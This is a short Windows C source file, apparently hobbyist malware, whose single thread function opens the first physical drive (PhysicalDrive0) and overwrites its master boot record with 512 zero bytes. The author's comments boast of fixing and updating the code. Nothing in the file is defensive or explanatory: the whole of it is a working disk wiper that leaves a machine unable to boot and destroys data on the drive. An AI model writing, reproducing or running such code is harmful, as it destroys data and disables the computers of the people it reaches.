// noskid


#include <windows.h>

const unsigned char MasterBootRecord[512] = { 0 };

DWORD WINAPI mbr(LPVOID lpParam) {
    HANDLE hFile = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD BytesWritten;
        WriteFile(hFile, MasterBootRecord, 512, &BytesWritten, NULL);
        CloseHandle(hFile);  // fixed version -lezus
    }
    return 0; // updated version becuz i forgot to close the thread (staring to realize how trash tf i am at c++, C# and plain c)
}
